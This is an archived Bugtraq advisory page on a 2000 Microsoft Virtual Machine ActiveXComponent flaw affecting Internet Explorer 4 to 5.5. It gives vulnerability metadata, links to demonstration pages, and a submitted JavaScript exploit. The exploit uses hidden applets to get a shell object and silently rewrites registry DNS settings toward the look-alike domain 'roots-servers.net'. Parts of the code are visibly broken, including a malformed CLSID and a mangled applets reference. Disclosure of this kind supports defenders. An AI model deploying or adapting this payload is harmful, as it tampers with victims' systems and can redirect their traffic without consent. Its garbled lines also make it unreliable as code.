#bid1754<p><b><span style="font-size: 18pt;">Microsoft Virtual Machine com.ms.activeX.ActiveXComponent Arbitrary Program Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1754/info">info</a><br><a href="http://www.securityfocus.com/bid/1754/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1754/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1754/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1754/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				1754
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Access Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Oct 05 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Oct 05 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Posted to Bugtraq on October 5, 2000 by Georgi Guninski &lt;guninski@guninski.com&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Virtual Machine 3300 Series  <br/>
<span class="related">
						
							-
						
						Microsoft Internet Explorer  5.5<br/>
</span>
					
				
					Microsoft Virtual Machine 3200 Series  <br/>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 <br/>
</span>
					
				
					Microsoft Virtual Machine 3100 Series  <br/>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.0 for Windows NT 4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.0 for Windows 98<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.0 for Windows 95<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.0 for Windows 2000<br/>
</span>
					
				
					Microsoft Virtual Machine 2000 Series  <br/>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  4.0 for Windows NT 4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  4.0 for Windows NT 3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  4.0 for Windows 95<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	Georgi Guninski &lt;guninski@guninski.com&gt; has set up the following demonstration pages:<br/><br/>Demo #1 - IE 5.5/Outlook security vulnerability - com.ms.activeX.ActiveXComponent allows executing arbitrary programs.  This page creates the file "EA.HTA" in your Startup folder - you shall see the result the next time you logon:<br/><br/>http://www.guninski.com/javaea1.html<br/><br/>Demo #2 - IE 5.5/Outlook security vulnerability - com.ms.activeX.ActiveXComponent allows executing arbitrary programs.  This page creates the file "EA" on Desktop:<br/><br/>http://www.guninski.com/javaea2.html<br/><br/>Exploit code submitted by Marcin Jackowski &lt;marcin@jackowski.net&gt;:<br/><br/>&lt;script&gt;<br/>document.write("&lt;APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent&gt;&lt;/APPLET&gt;");<br/>function yuzi3(){<br/>    try{<br/>        a1=document.applets0;<br/>        a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");<br/>        a1.createInstance();Shl = a1.GetObject();<br/>        a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");<br/>        try{<br/><br/>Shl.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\VxD\\MSTCP\\SearchList","roots-servers.net");<br/>        }<br/>        catch(e){}<br/>    }<br/>    catch(e){}<br/>}<br/>setTimeout("yuzi3()",1000);<br/>document.write("&lt;APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent&gt;&lt;/APPLET&gt;");<br/>function yuzi2(){<br/>    try{<br/>        a2=document.applets0;a2.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");<br/>        a2.createInstance();Shl =<br/>a2.GetObject();a2.setCLSID("{0D43FE01-F093-11CF-89400-0A0C9054228}");<br/>            try{<br/><br/>Shl.RegWrite("HKLM\\System\\CurrentControlSet\\Services\\VxD\\MSTCP\\EnableDns","1");<br/>            }<br/>        catch(e){}<br/>    }<br/>    catch(e){}<br/>}setTimeout("yuzi2()",1000);<br/>&lt;/script&gt;
	
		<ul>
</ul>
</div>